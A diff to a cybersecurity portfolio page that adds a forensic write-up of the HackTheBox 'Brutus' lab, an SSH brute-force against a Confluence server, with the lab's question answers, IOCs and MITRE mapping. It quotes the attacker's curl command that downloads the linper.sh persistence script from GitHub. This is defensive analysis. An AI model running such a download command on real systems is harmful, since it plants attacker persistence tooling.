@@ -497,7 +497,222 @@ Investigation Standards & Methodology
 <span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> service</span><span style="color:#9ECBFF"> ssh</span><span style="color:#9ECBFF"> restart</span></span></code></pre>
 </li>
 <li><strong>Interactive Access:</strong> Shortly after execution, IP <code>95.181.232.30</code> initiated an active SSH session to the server.</li>
-</ol> </div> </div> </article> </div> </section>  <script type="module">document.querySelectorAll(".lab-card").forEach(n=>{const e=n.querySelector(".lab-toggle"),t=n.querySelector(".lab-body"),s=n.querySelector(".lab-toggle-btn span");e&&t&&s&&e.addEventListener("click",()=>{!t.classList.contains("hidden")?(t.classList.add("hidden"),s.textContent="▼ READ REPORT",e.setAttribute("aria-expanded","false")):(t.classList.remove("hidden"),s.textContent="▲ HIDE REPORT",e.setAttribute("aria-expanded","true"))})});</script> <section id="projects" class="py-24 max-w-[1200px] mx-auto px-6 sm:px-12"> <div class="mb-12 reveal"> <span class="text-xs font-mono font-bold uppercase tracking-[4px] text-[var(--text-muted)]">
+</ol> </div> </div> </article><article class="lab-card cyber-frame p-6 sm:p-8 reveal reveal-d1 transition-all" data-lab-id="brutus-ssh-brute-force"> <!-- Top Badges / Meta --> <div class="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-[var(--border-subtle)]"> <div class="flex flex-wrap items-center gap-2"> <span class="font-mono text-[0.65rem] font-bold px-3 py-1 bg-[var(--bg-elevated)] border border-[var(--border-frame)] text-[var(--accent-active)] tracking-wider uppercase"> HTB Sherlock / DFIR </span> <span class="font-mono text-[0.65rem] font-bold px-2.5 py-1 bg-[var(--accent-progress)]/10 border border-[var(--accent-progress)]/30 text-[var(--accent-progress)] tracking-wider uppercase"> Easy </span> </div> <span class="font-mono text-xs text-[var(--text-muted)]"> 3 August 2026 </span> </div> <!-- Title & Summary --> <div class="py-5 cursor-pointer lab-toggle group" role="button" tabindex="0" aria-expanded="false"> <div class="flex items-start justify-between gap-4"> <div> <h3 class="text-xl sm:text-2xl font-extrabold text-[var(--text-primary)] group-hover:text-[var(--accent-active)] transition-colors cyber-glitch" data-text="Brutus — Unix SSH Brute-Force &#38; Post-Exploitation Analysis"> Brutus — Unix SSH Brute-Force &amp; Post-Exploitation Analysis </h3> <p class="text-sm text-[var(--text-body)] mt-2 leading-relaxed"> Analysis of a Linux Confluence server breach via SSH brute-force. Investigated auth.log and wtmp artifacts to trace credential access, privilege escalation, persistence via local account creation, and post-exploitation script execution. </p> <div class="flex flex-wrap gap-1.5 mt-4"> <span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> auth.log </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> wtmp </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> utmp.py </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> MITRE ATT&amp;CK </span> </div> </div> <button type="button" class="shrink-0 p-2 border border-[var(--border-frame)] bg-[var(--bg-surface)] text-[var(--text-primary)] group-hover:border-[var(--text-primary)] transition-all lab-toggle-btn mt-1" aria-label="Toggle full lab writeup"> <span class="font-mono text-xs font-bold block"> ▼ READ REPORT </span> </button> </div> </div> <!-- Expandable Report Body Content --> <div class="lab-body overflow-hidden transition-all duration-500 hidden"> <div class="pt-6 border-t border-[var(--border-subtle)] lab-markdown text-sm sm:text-base"> <h2 id="scenario">Scenario</h2>
+<p>In this Sherlock, we investigate a <strong>Confluence server</strong> that was brute-forced via its SSH service. After gaining access, the attacker performed additional activities including privilege escalation, persistence through local account creation, and downloading an external reconnaissance script. The investigation leverages <strong>auth.log</strong> and <strong>wtmp</strong> artifacts to reconstruct the full attack chain.</p>
+<hr>
+<h2 id="tools--artifacts">Tools &#x26; Artifacts</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Artifact</th><th>Description</th></tr></thead><tbody><tr><td><code>auth.log</code></td><td>Linux authentication log — tracks SSH login attempts, <code>sudo</code> actions, user creation events, and session IDs</td></tr><tr><td><code>wtmp</code></td><td>Binary login/logout record — provides precise session connection timelines and durations</td></tr><tr><td><code>utmp.py</code></td><td>Python utility for decoding <code>wtmp</code> binary on cross-architecture forensic workstations</td></tr></tbody></table>
+<hr>
+<h2 id="understanding-the-artifacts">Understanding the Artifacts</h2>
+<h3 id="authlog">auth.log</h3>
+<p>Primarily used for tracking authentication mechanisms. Whenever a user attempts to login, switch users, or perform any task that requires authentication, an entry is made in this log file. This includes activities involving <code>sshd</code> (SSH daemon), <code>sudo</code> actions, and cron jobs requiring authentication.</p>
+<p><strong>Key fields in auth.log:</strong></p>
+<ul>
+<li><strong>Date and Time</strong> — timestamp of the event</li>
+<li><strong>Hostname</strong> — system where the event occurred</li>
+<li><strong>Service</strong> — daemon reporting the event (e.g., <code>sshd</code>)</li>
+<li><strong>PID</strong> — Process ID of the service</li>
+<li><strong>User</strong> — username involved in authentication</li>
+<li><strong>Authentication Status</strong> — success or failure details</li>
+<li><strong>IP Address/Hostname</strong> — source of remote connections</li>
+<li><strong>Message</strong> — detailed event description including error codes</li>
+</ul>
+<h3 id="wtmp">wtmp</h3>
+<p>Records all login and logout events on the system. It is a binary file typically located at <code>/var/log/wtmp</code>. Provides the history of user logins/logouts, system reboots, and runlevel changes.</p>
+<p><strong>Key fields in utmp.py output:</strong></p>
+<ul>
+<li><strong>Type</strong> — record type (login, logout, boot, shutdown)</li>
+<li><strong>PID</strong> — Process ID related to the event</li>
+<li><strong>Line</strong> — terminal line (<code>tty</code> or <code>pts</code>)</li>
+<li><strong>User</strong> — username associated with the event</li>
+<li><strong>Host</strong> — source hostname or IP address</li>
+<li><strong>Session</strong> — session ID</li>
+<li><strong>sec</strong> — event timestamp (presented in forensic workstation timezone)</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> When the CPU architecture of the forensic investigator’s system differs from the source system, built-in tools like <code>last</code> or <code>utmpdump</code> may produce incorrect output. The provided <code>utmp.py</code> tool handles cross-architecture decoding.</p>
+</blockquote>
+<hr>
+<h2 id="step-by-step-investigation">Step-by-Step Investigation</h2>
+<h3 id="1-identifying-the-brute-force-source">1. Identifying the Brute-Force Source</h3>
+<p><strong>Q: What is the IP address used by the attacker to carry out the brute-force attack?</strong></p>
+<p>Analysis of <code>auth.log</code> revealed a high volume of failed SSH authentication attempts originating from a single IP address:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># Repeated failed password entries in auth.log from:</span></span>
+<span class="line"><span>65.2.161.68</span></span></code></pre>
+<p><strong>Answer:</strong> <code>65.2.161.68</code></p>
+<hr>
+<h3 id="2-compromised-account-identification">2. Compromised Account Identification</h3>
+<p><strong>Q: The brute-force attempts were successful — what is the username of the compromised account?</strong></p>
+<p>After numerous failed attempts, the attacker successfully authenticated to the <code>root</code> account.</p>
+<p><strong>Answer:</strong> <code>root</code></p>
+<hr>
+<h3 id="3-interactive-session-timestamp">3. Interactive Session Timestamp</h3>
+<p><strong>Q: Identify the UTC timestamp when the attacker logged in manually and established a terminal session.</strong></p>
+<p>The <code>wtmp</code> artifact confirms the interactive session start time. The login time differs from the authentication time — <code>wtmp</code> records the actual terminal session establishment.</p>
+<p><strong>Answer:</strong> <code>2024-03-06 06:32:45</code></p>
+<hr>
+<h3 id="4-ssh-session-number">4. SSH Session Number</h3>
+<p><strong>Q: What is the session number assigned to the attacker’s session?</strong></p>
+<p>SSH login sessions are tracked and assigned a session number upon login.</p>
+<p><strong>Answer:</strong> <code>37</code></p>
+<hr>
+<h3 id="5-persistence--backdoor-account">5. Persistence — Backdoor Account</h3>
+<p><strong>Q: The attacker added a new user as part of their persistence strategy. What is the name of this account?</strong></p>
+<p>Attackers often create new user accounts for persistence — maintaining unauthorized access without additional tooling, essentially “living off the land.” The <code>auth.log</code> shows user creation events:</p>
+<p><strong>Answer:</strong> <code>cyberjunkie</code></p>
+<hr>
+<h3 id="6-mitre-attck-sub-technique">6. MITRE ATT&#x26;CK Sub-Technique</h3>
+<p><strong>Q: What is the MITRE ATT&#x26;CK sub-technique ID used for persistence by creating a new account?</strong></p>
+<p><strong>Answer:</strong> <code>T1136.001</code> — Create Account: Local Account</p>
+<hr>
+<h3 id="7-session-termination">7. Session Termination</h3>
+<p><strong>Q: What time did the attacker’s first SSH session end according to auth.log?</strong></p>
+<p><strong>Answer:</strong> <code>2024-03-06 06:37:24</code></p>
+<hr>
+<h3 id="8-post-exploitation-command">8. Post-Exploitation Command</h3>
+<p><strong>Q: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</strong></p>
+<p>The attacker logged into the <code>cyberjunkie</code> backdoor account and used <code>sudo</code> to fetch a Linux persistence/enumeration script:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">/usr/bin/curl</span><span style="color:#9ECBFF"> https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></span></code></pre>
+<hr>
+<h2 id="evidence--iocs">Evidence &#x26; IOCs</h2>
+<h3 id="network-indicators">Network Indicators</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>65.2.161.68</code></td><td>IP Address</td><td>Attacker source IP — SSH brute-force origin</td></tr><tr><td><code>https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></td><td>URL</td><td>External persistence/enumeration script fetched via <code>curl</code></td></tr></tbody></table>
+<h3 id="host-indicators">Host Indicators</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>root</code></td><td>Account</td><td>Initially compromised account via brute-force</td></tr><tr><td><code>cyberjunkie</code></td><td>Account</td><td>Backdoor persistence account created by attacker</td></tr><tr><td><code>linper.sh</code></td><td>Script</td><td>Linux persistence/enumeration toolkit downloaded post-exploitation</td></tr></tbody></table>
+<hr>
+<h2 id="mitre-attck-mapping">MITRE ATT&#x26;CK Mapping</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tactic</th><th>Technique / Sub-Technique</th><th>ID</th><th>Artifact / Activity</th></tr></thead><tbody><tr><td><strong>Credential Access</strong></td><td>Brute Force: Password Guessing</td><td><code>T1110.001</code></td><td>Inbound SSH password brute-force against <code>root</code> from IP <code>65.2.161.68</code></td></tr><tr><td><strong>Persistence / Privilege Escalation</strong></td><td>Create Account: Local Account</td><td><code>T1136.001</code></td><td>Creation of backdoor user <code>cyberjunkie</code> with elevated privileges</td></tr><tr><td><strong>Execution</strong></td><td>Command &#x26; Scripting Interpreter: Unix Shell</td><td><code>T1059.004</code></td><td>Execution of <code>curl</code> via <code>sudo</code> to pull the <code>linper.sh</code> persistence script</td></tr></tbody></table>
+<hr>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>An SSH brute-force attack targeting a Linux server hosting Confluence resulted in a successful breach of the <code>root</code> account. Analysis of <code>auth.log</code> and <code>wtmp</code> revealed that after gaining initial access, the threat actor created a privileged backdoor user (<code>cyberjunkie</code>) for persistence and leveraged <code>sudo</code> privileges to fetch an external reconnaissance/persistence script from GitHub.</p>
+<h3 id="incident-timeline">Incident Timeline</h3>
+<ol>
+<li>
+<p><strong>Initial Access &#x26; SSH Brute-Force</strong> — Threat actor IP <code>65.2.161.68</code> conducted an SSH brute-force attack, successfully guessing the credentials for the <code>root</code> account.</p>
+</li>
+<li>
+<p><strong>Interactive Session Established</strong> — At <code>2024-03-06 06:32:45 UTC</code>, the attacker initiated a manual interactive terminal session (SSH session ID <code>37</code>) as <code>root</code>.</p>
+</li>
+<li>
+<p><strong>Persistence Mechanism</strong> — Living off the land, the attacker created a new local account named <code>cyberjunkie</code> and granted it elevated privileges.</p>
+</li>
+<li>
+<p><strong>Session Termination</strong> — The initial <code>root</code> SSH session terminated at <code>2024-03-06 06:37:24 UTC</code>.</p>
+</li>
+<li>
+<p><strong>Post-Exploitation &#x26; Script Execution</strong> — The attacker logged into the backdoor <code>cyberjunkie</code> account and executed <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code> via <code>sudo</code>.</p>
+</li>
+</ol>
+<h3 id="log-artifact-summary">Log Artifact Summary</h3>
+<ul>
+<li><strong>auth.log</strong> — Provided visibility into authentication failures, successful <code>root</code> logins, user creation events (<code>cyberjunkie</code>), session IDs, and executed <code>sudo</code> commands.</li>
+<li><strong>wtmp</strong> — Provided precise session connection timelines, verifying the interactive terminal session at <code>06:32:45 UTC</code>.</li>
+</ul>
+<hr>
+<h2 id="skills-developed">Skills Developed</h2>
+<ul>
+<li>Unix authentication log analysis (<code>auth.log</code>)</li>
+<li>Binary <code>wtmp</code> log analysis and cross-architecture decoding</li>
+<li>Brute-force attack pattern recognition</li>
+<li>Incident timeline reconstruction</li>
+<li>Post-exploitation activity tracking</li>
+<li>MITRE ATT&#x26;CK framework mapping</li>
+</ul> </div> </div> </article> </div> </section>  <script type="module">document.querySelectorAll(".lab-card").forEach(n=>{const e=n.querySelector(".lab-toggle"),t=n.querySelector(".lab-body"),s=n.querySelector(".lab-toggle-btn span");e&&t&&s&&e.addEventListener("click",()=>{!t.classList.contains("hidden")?(t.classList.add("hidden"),s.textContent="▼ READ REPORT",e.setAttribute("aria-expanded","false")):(t.classList.remove("hidden"),s.textContent="▲ HIDE REPORT",e.setAttribute("aria-expanded","true"))})});</script> <section id="projects" class="py-24 max-w-[1200px] mx-auto px-6 sm:px-12"> <div class="mb-12 reveal"> <span class="text-xs font-mono font-bold uppercase tracking-[4px] text-[var(--text-muted)]">
 Featured Projects & Homelabs
 </span> </div> <div class="space-y-16"> <!-- Project 1: VULN-INTELLIGEN --> <div class="cyber-frame p-6 sm:p-10 grid grid-cols-1 lg:grid-cols-12 gap-8 items-center reveal reveal-d1"> <div class="lg:col-span-7 space-y-6"> <div> <span class="font-mono text-xs font-bold text-[var(--text-muted)] uppercase tracking-wider block mb-1">Final-Year Research Project</span> <h3 class="text-2xl sm:text-3xl font-black text-[var(--text-primary)] uppercase tracking-tight cyber-glitch" data-text="VULN-INTELLIGEN">VULN-INTELLIGEN</h3> </div> <div class="space-y-4"> <p class="text-sm text-[var(--text-body)] leading-relaxed">
 The VULN-INTELLIGEN project demonstrates that context-aware, AI-driven triage is no longer a luxury, but a necessity for modern cybersecurity operations. By transitioning from a static "Global Base" metric (CVSS) to a "Localized Tactical Priority" score, the system empowers security teams to cut through alert fatigue and focus exclusively on threats that pose a demonstrable risk to their specific infrastructure.
